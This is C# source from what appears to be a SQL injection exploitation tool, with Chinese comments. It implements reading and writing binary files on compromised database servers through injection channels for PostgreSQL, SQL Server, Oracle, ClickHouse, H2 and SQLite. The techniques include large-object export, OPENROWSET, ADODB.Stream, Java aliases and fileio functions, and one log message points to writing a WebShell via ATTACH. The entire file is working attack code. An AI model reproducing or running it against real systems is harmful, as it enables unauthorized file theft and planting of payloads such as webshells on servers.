            bool stacked = config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked);
            if (!EnsurePgBinaryChannel(config, ref stacked))
            {
                return;
            }
            int oid = 90300 + new Random().Next(0, 6000);
            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
            if (!stacked)
            {
                //Union/报错单发：lo_from_bytea一次性写入（大小受请求长度限制）；超限且有堆叠记录时自动降级堆叠分页
                if (data.Length > 4000)
                {
                    if (!TryAutoSwitchStacked(config, "PG二进制上传（超4KB）"))
                    {
                        Log.Warning("Union/报错单发上传超过4KB（" + data.Length + "字节），请求体可能超限，且注入记录中无堆叠通道可降级，请改用堆叠注入点！");
                        return;
                    }
                    stacked = true;
                }
            }
            if (!stacked)
            {
                Log.Show("大对象二进制上传（" + data.Length + "字节，loid=" + oid + "）……");
                await FetchScalar(config, "(select lo_from_bytea(" + oid + ",decode('" + Convert.ToHexString(data) + "','hex')))").ConfigureAwait(false);
            }
            else
            {
                //堆叠分页写（2048字节/页对齐pg_largeobject页结构）
                int pageSize = 2048;
                int pages = (data.Length + pageSize - 1) / pageSize;
                Log.Show("堆叠分片二进制上传（" + data.Length + "字节，" + pages + "页×" + pageSize + "字节，loid=" + oid + "）……");
                await SendStackedStmt(config, "select lo_create(" + oid + ")").ConfigureAwait(false);
                await SendStackedStmt(config, "delete from pg_largeobject where loid=" + oid).ConfigureAwait(false);
                for (int i = 0; i < pages; i++)
                {
                    config.CheckStop();
                    int off = i * pageSize;
                    int len = Math.Min(pageSize, data.Length - off);
                    await SendStackedStmt(config, "insert into pg_largeobject(loid,pageno,data) values (" + oid + "," + i + ",decode('" + Convert.ToHexString(data, off, len) + "','hex'))").ConfigureAwait(false);
                    Log.SysLog("已上传分片 " + (i + 1) + "/" + pages);
                }
            }
            //写前验证：大对象字节数比对（导出前比对，失败不污染磁盘）
            string lenStr = await FetchScalar(config, "(select coalesce(sum(length(data)),0) from pg_largeobject where loid=" + oid + ")").ConfigureAwait(false);
            if (!int.TryParse(lenStr, out int loLen) || loLen != data.Length)
            {
                Log.Warning("大对象写入长度校验未通过（写入=" + (lenStr ?? "读取失败") + "，本地=" + data.Length + "），已放弃导出！");
                try
                {
                    if (stacked)
                    {
                        await SendStackedStmt(config, "select lo_unlink(" + oid + ")").ConfigureAwait(false);
                    }
                    else
                    {
                        await FetchScalar(config, "(select lo_unlink(" + oid + "))").ConfigureAwait(false);
                    }
                }
                catch (Exception)
                {
                }
                return;
            }
            if (stacked)
            {
                await SendStackedStmt(config, "select lo_export(" + oid + ",'" + pathEsc + "')").ConfigureAwait(false);
                await SendStackedStmt(config, "select lo_unlink(" + oid + ")").ConfigureAwait(false);
            }
            else
            {
                await FetchScalar(config, "(select lo_export(" + oid + ",'" + pathEsc + "'))").ConfigureAwait(false);
                try
                {
                    await FetchScalar(config, "(select lo_unlink(" + oid + "))").ConfigureAwait(false);
                }
                catch (Exception)
                {
                }
            }
            Log.Success("二进制上传完成：" + vm.FilePath + "（" + data.Length + "字节，写入长度已校验）；请人工确认目标文件可访问！");
        }

        //---------- SQLServer：OPENROWSET SINGLE_BLOB 下载 / ADODB.Stream 上传（已实测SQL2022字节无损） ----------

        /// <summary>堆叠语句发送（时间通道去掉 1=1; 前缀，与ReadSqlServerScalar一致）</summary>
        private static async Task SendSqlServerStacked(AppConfig config, string payload)
        {
            if (config.DataConfig.IsTimeChannel)
            {
                payload = payload.Replace(" 1=1;", ";", StringComparison.Ordinal);
            }
            await SendPayload(config, payload).ConfigureAwait(false);
        }

        /// <summary>SQLServer 二进制下载：OPENROWSET(BULK..SINGLE_BLOB)入临时表→convert(varchar(max),b,2)取hex→清理（需堆叠建表+OPENROWSET权限，取数全通道可用）</summary>
        private static async Task BinaryDownloadSqlServer(AppConfig config, FileCmdViewModel vm)
        {
            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
            Log.Show("二进制下载：" + vm.FilePath + " ……");
            await SendSqlServerStacked(config, PayloadFactory.BasePayload.Get("FileBinaryReadSetup").Replace("{path}", pathEsc, StringComparison.Ordinal)).ConfigureAwait(false);
            try
            {
                string hex = await FetchHexString(config, PayloadFactory.BasePayload.Get("FileBinaryHex"), 64 * 1024 * 1024).ConfigureAwait(false);
                FinishBinaryDownload(vm, HexToBytes(hex), "可能原因：文件不存在/无读权限/OPENROWSET被禁用（需Ad Hoc Distributed Queries或sysadmin）。");
            }
            finally
            {
                try
                {
                    await SendSqlServerStacked(config, PayloadFactory.BasePayload.Get("CmdDropTable")).ConfigureAwait(false);
                }
                catch (Exception)
                {
                }
            }
        }

        /// <summary>SQLServer 二进制上传：临时表varbinary分片→@bin+=data聚合→ADODB.Stream(Type=1)写出；写后OPENROWSET回读datalength验证（需堆叠+Ole Automation）</summary>
        private static async Task BinaryUploadSqlServer(AppConfig config, FileCmdViewModel vm)
        {
            byte[]? data = RequireUploadBytes(vm);
            if (data == null)
            {
                return;
            }
            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
            int chunkSize = UploadChunkSize(config, 7000);
            int chunks = (data.Length + chunkSize - 1) / chunkSize;
            Log.Show("ADODB.Stream二进制上传（" + data.Length + "字节，" + chunks + "片×" + chunkSize + "字节）……");
            await SendSqlServerStacked(config, PayloadFactory.BasePayload.Get("FileBinaryWriteCreate")).ConfigureAwait(false);
            try
            {
                for (int i = 0; i < chunks; i++)
                {
                    config.CheckStop();
                    int off = i * chunkSize;
                    int len = Math.Min(chunkSize, data.Length - off);
                    await SendSqlServerStacked(config, PayloadFactory.BasePayload.Get("FileBinaryWriteChunk").Replace("{chunk}", "0x" + Convert.ToHexString(data, off, len), StringComparison.Ordinal)).ConfigureAwait(false);
                    Log.SysLog("已上传分片 " + (i + 1) + "/" + chunks);
                }
                await SendSqlServerStacked(config, PayloadFactory.BasePayload.Get("FileBinaryWriteFlush").Replace("{path}", pathEsc, StringComparison.Ordinal)).ConfigureAwait(false);
            }
            finally
            {
                try
                {
                    await SendSqlServerStacked(config, PayloadFactory.BasePayload.Get("FileBinaryWriteDrop")).ConfigureAwait(false);
                }
                catch (Exception)
                {
                }
            }
            //写后验证：OPENROWSET回读datalength比对
            try
            {
                await SendSqlServerStacked(config, PayloadFactory.BasePayload.Get("FileBinaryReadSetup").Replace("{path}", pathEsc, StringComparison.Ordinal)).ConfigureAwait(false);
                string lenStr = await FetchScalar(config, PayloadFactory.BasePayload.Get("FileBinaryLen")).ConfigureAwait(false);
                if (int.TryParse(lenStr, out int remoteLen) && remoteLen == data.Length)
                {
                    Log.Success("二进制上传验证通过：远端文件 " + remoteLen + " 字节，与本地一致！");
                }
                else
                {
                    Log.Warning("写后验证未通过（远端长度=" + (lenStr ?? "读取失败") + "，本地=" + data.Length + "）！请人工检查ADODB写出是否成功（Ole Automation/目录权限）。");
                }
            }
            finally
            {
                try
                {
                    await SendSqlServerStacked(config, PayloadFactory.BasePayload.Get("CmdDropTable")).ConfigureAwait(false);
                }
                catch (Exception)
                {
                }
            }
        }

        //---------- Oracle：Java通道 hex 分片双向（SqliReadHex/SqliWriteBin/SqliFileSize，varchar2(4000)→1500字节/片） ----------

        /// <summary>Oracle Java 二进制分片大小（hex后3000字符&lt;varchar2(4000)上限）</summary>
        private const int OraBinChunk = 1500;

        /// <summary>Oracle 二进制下载：SqliFileSize取大小→SqliReadHex分片取hex（Java RandomAccessFile seek）</summary>
        private static async Task BinaryDownloadOracle(AppConfig config, FileCmdViewModel vm)
        {
            await EnsureOracleJavaReady(config).ConfigureAwait(false);
            string pathHex = Convert.ToHexString(Encoding.UTF8.GetBytes(vm.FilePath));
            string sizeStr = await FetchScalar(config, "(select SqliFileSize(utl_raw.cast_to_varchar2(hextoraw('" + pathHex + "'))) from dual)").ConfigureAwait(false);
            if (!long.TryParse(sizeStr, out long size) || size < 0)
            {
                Log.Warning("获取文件大小失败：" + sizeStr + "（文件不存在/无权限/Java通道未就绪）");
                return;
            }
            Log.Show("二进制下载：" + vm.FilePath + "（" + size + "字节，分片" + OraBinChunk + "字节）……");
            StringBuilder hexAll = new StringBuilder((int)Math.Min(size * 2, int.MaxValue));
            for (long off = 0; off < size; off += OraBinChunk)
            {
                config.CheckStop();
                int len = (int)Math.Min(OraBinChunk, size - off);
                string chunk = await FetchScalar(config, "(select SqliReadHex(utl_raw.cast_to_varchar2(hextoraw('" + pathHex + "'))," + off + "," + len + ") from dual)").ConfigureAwait(false);
                if ((chunk ?? "").StartsWith("ERR:", StringComparison.Ordinal))
                {
                    Log.Warning("分片读取失败（offset=" + off + "）：" + chunk);
                    break;
                }
                hexAll.Append(chunk);
                Log.SysLog("已下载分片 offset=" + off + "/" + size);
            }
            FinishBinaryDownload(vm, HexToBytes(hexAll.ToString()), "可能原因：文件不存在/无读权限/Java通道未部署成功。");
        }

        /// <summary>Oracle 二进制上传：SqliWriteBin分片append写（FileOutputStream append模式）</summary>
        private static async Task BinaryUploadOracle(AppConfig config, FileCmdViewModel vm)
        {
            byte[]? data = RequireUploadBytes(vm);
            if (data == null)
            {
                return;
            }
            await EnsureOracleJavaReady(config).ConfigureAwait(false);
            string pathHex = Convert.ToHexString(Encoding.UTF8.GetBytes(vm.FilePath));
            int chunks = (data.Length + OraBinChunk - 1) / OraBinChunk;
            Log.Show("Java二进制上传（" + data.Length + "字节，" + chunks + "片×" + OraBinChunk + "字节）……");
            for (int i = 0; i < chunks; i++)
            {
                config.CheckStop();
                int off = i * OraBinChunk;
                int len = Math.Min(OraBinChunk, data.Length - off);
                string chunkHex = Convert.ToHexString(data, off, len);
                string result = await FetchScalar(config, "(select SqliWriteBin(utl_raw.cast_to_varchar2(hextoraw('" + pathHex + "')),'" + chunkHex + "'," + (i == 0 ? 0 : 1) + ") from dual)").ConfigureAwait(false);
                if (!(result ?? "").StartsWith("OK", StringComparison.Ordinal))
                {
                    Log.Warning("分片写入失败（" + (i + 1) + "/" + chunks + "）：" + result);
                    return;
                }
                Log.SysLog("已上传分片 " + (i + 1) + "/" + chunks);
            }
            //写后验证：SqliFileSize比对
            string sizeStr = await FetchScalar(config, "(select SqliFileSize(utl_raw.cast_to_varchar2(hextoraw('" + pathHex + "'))) from dual)").ConfigureAwait(false);
            if (long.TryParse(sizeStr, out long remoteSize) && remoteSize == data.Length)
            {
                Log.Success("二进制上传验证通过：远端文件 " + remoteSize + " 字节，与本地一致！");
            }
            else
            {
                Log.Warning("写后验证未通过（远端大小=" + (sizeStr ?? "读取失败") + "，本地=" + data.Length + "），请人工检查！");
            }
        }

        //---------- ClickHouse：file() RawBLOB 整读 + hex 下载（仅user_files目录） ----------

        /// <summary>ClickHouse 二进制下载：file(path,'RawBLOB','s String')整文件单值→hex()取回（仅user_files目录）</summary>
        private static async Task BinaryDownloadClickHouse(AppConfig config, FileCmdViewModel vm)
        {
            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
            Log.Show("二进制下载：" + vm.FilePath + " ……");
            string hex = await FetchHexString(config, "(select hex(s) from file('" + pathEsc + "','RawBLOB','s String'))", 64 * 1024 * 1024).ConfigureAwait(false);
            FinishBinaryDownload(vm, HexToBytes(hex), "可能原因：文件不在user_files目录/无读权限/盲注判断值未配置。");
        }

        //---------- H2：FILE_READ(BLOB)+RAWTOHEX 下载 / FILE_WRITE(x'hex') 上传（内置函数，需admin；H2 1.x/2.x均保留） ----------

        /// <summary>H2 二进制下载：rawtohex(file_read(path))——FILE_READ单参数返回BLOB字节无损，hex后全通道取回（需admin权限）</summary>
        private static async Task BinaryDownloadH2(AppConfig config, FileCmdViewModel vm)
        {
            string Enc(string s) => TextCodec.StrToChrOrChar(s, "char", "||", "UTF-8");
            Log.Show("二进制下载：" + vm.FilePath + " ……");
            string hex = await FetchHexString(config, "rawtohex(file_read(" + Enc(vm.FilePath) + "))", 64 * 1024 * 1024).ConfigureAwait(false);
            FinishBinaryDownload(vm, HexToBytes(hex), "可能原因：文件不存在/非admin权限（FILE_READ需admin）/盲注判断值未配置。");
        }

        /// <summary>H2 二进制上传：小文件file_write(x'hex',path)单发（返回写入字节数直接验证）；大文件CREATE ALIAS分片append（需JDK编译器）</summary>
        private static async Task BinaryUploadH2(AppConfig config, FileCmdViewModel vm)
        {
            byte[]? data = RequireUploadBytes(vm);
            if (data == null)
            {
                return;
            }
            string Enc(string s) => TextCodec.StrToChrOrChar(s, "char", "||", "UTF-8");
            if (config.DataConfig.SelectedInjectType.Equals(InjectType.Blind)
                || config.DataConfig.SelectedInjectType.Equals(InjectType.Time)
                || config.DataConfig.SelectedInjectType.Equals(InjectType.Dns))
            {
                Log.Warning("H2二进制上传为副作用表达式，盲注/时间/DNS通道会多次求值，请用Union/报错/堆叠通道！");
                return;
            }
            string pathEnc = Enc(vm.FilePath);
            int chunkSize = UploadChunkSize(config, 4000);
            if (data.Length <= chunkSize)
            {
                //单发：file_write返回写入字节数，天然写后验证
                Log.Show("FILE_WRITE二进制上传（" + data.Length + "字节）……");
                string written = await FetchScalar(config, "file_write(x'" + Convert.ToHexString(data) + "'," + pathEnc + ")").ConfigureAwait(false);
                if (int.TryParse(written, out int w) && w == data.Length)
                {
                    Log.Success("二进制上传验证通过：远端写入 " + w + " 字节，与本地一致！");
                }
                else
                {
                    Log.Warning("写后验证未通过（file_write返回=" + (written ?? "无") + "，本地=" + data.Length + "）！可能原因：非admin权限/目录不可写。");
                }
                return;
            }
            //大文件：CREATE ALIAS SQFW 分片append（与SQX同前提：JDK编译器）
            int chunks = (data.Length + chunkSize - 1) / chunkSize;
            Log.Show("CREATE ALIAS分片二进制上传（" + data.Length + "字节，" + chunks + "片×" + chunkSize + "字节）……");
            string javaSrc = "String sqfw(String path, String hex, int append) throws Exception { java.io.FileOutputStream f = new java.io.FileOutputStream(path, append == 1); for (int i = 0; i + 1 < hex.length(); i += 2) { f.write(Integer.parseInt(hex.substring(i, i + 2), 16)); } f.close(); return \"OK\"; }";
            await SendPayload(config, " 1=1;drop alias if exists SQFW;create alias SQFW as $$" + javaSrc + "$$;-- ").ConfigureAwait(false);
            for (int i = 0; i < chunks; i++)
            {
                config.CheckStop();
                int off = i * chunkSize;
                int len = Math.Min(chunkSize, data.Length - off);
                string result = await FetchScalar(config, "SQFW(" + pathEnc + ",'" + Convert.ToHexString(data, off, len) + "'," + (i == 0 ? 0 : 1) + ")").ConfigureAwait(false);
                if (!(result ?? "").StartsWith("OK", StringComparison.Ordinal))
                {
                    Log.Warning("分片写入失败（" + (i + 1) + "/" + chunks + "）：" + result + "（需JDK编译器javax.tools可用）");
                    return;
                }
                Log.SysLog("已上传分片 " + (i + 1) + "/" + chunks);
            }
            //写后验证：file_read长度比对
            string lenStr = await FetchScalar(config, "length(file_read(" + pathEnc + "))").ConfigureAwait(false);
            if (int.TryParse(lenStr, out int remoteLen) && remoteLen == data.Length)
            {
                Log.Success("二进制上传验证通过：远端文件 " + remoteLen + " 字节，与本地一致！");
            }
            else
            {
                Log.Warning("写后验证未通过（远端长度=" + (lenStr ?? "读取失败") + "，本地=" + data.Length + "），请人工检查！");
            }
        }

        //---------- SQLite：fileio扩展 readfile/writefile（blob无损，仅加载该扩展的目标可用，如Calibre） ----------

        /// <summary>SQLite 二进制下载：hex(readfile(path))——fileio扩展blob读取字节无损（无扩展时函数不存在，报错提示）</summary>
        private static async Task BinaryDownloadSqlite(AppConfig config, FileCmdViewModel vm)
        {
            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
            Log.Show("二进制下载：" + vm.FilePath + " ……（依赖目标加载fileio扩展的readfile()）");
            string hex = await FetchHexString(config, "(hex(readfile('" + pathEsc + "')))", 64 * 1024 * 1024).ConfigureAwait(false);
            FinishBinaryDownload(vm, HexToBytes(hex), "可能原因：目标未加载fileio扩展（readfile函数不存在）/文件不存在/无读权限。");
        }

        /// <summary>SQLite 二进制上传：writefile(path,x'hex')单发（返回写入字节数直接验证；fileio扩展blob写入无损）</summary>
        private static async Task BinaryUploadSqlite(AppConfig config, FileCmdViewModel vm)
        {
            byte[]? data = RequireUploadBytes(vm);
            if (data == null)
            {
                return;
            }
            if (config.DataConfig.SelectedInjectType.Equals(InjectType.Blind)
                || config.DataConfig.SelectedInjectType.Equals(InjectType.Time)
                || config.DataConfig.SelectedInjectType.Equals(InjectType.Dns))
            {
                Log.Warning("SQLite writefile为副作用表达式，盲注/时间/DNS通道会多次求值，请用Union/报错/堆叠通道！");
                return;
            }
            int limit = UploadChunkSize(config, 4000);
            if (data.Length > limit)
            {
                Log.Warning("writefile为整写函数无追加能力，本次" + data.Length + "字节超出单发上限" + limit + "字节，请精简文件或改用ATTACH写WebShell！");
                return;
            }
            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
            Log.Show("writefile二进制上传（" + data.Length + "字节）……（依赖目标加载fileio扩展）");
            string written = await FetchScalar(config, "(writefile('" + pathEsc + "',x'" + Convert.ToHexString(data) + "'))").ConfigureAwait(false);
            if (int.TryParse(written, out int w) && w == data.Length)
            {
                Log.Success("二进制上传验证通过：远端写入 " + w + " 字节，与本地一致！");
            }
            else
            {
                Log.Warning("写后验证未通过（writefile返回=" + (written ?? "无") + "，本地=" + data.Length + "）！可能原因：目标未加载fileio扩展/目录不可写。");
            }
        }

    }
}
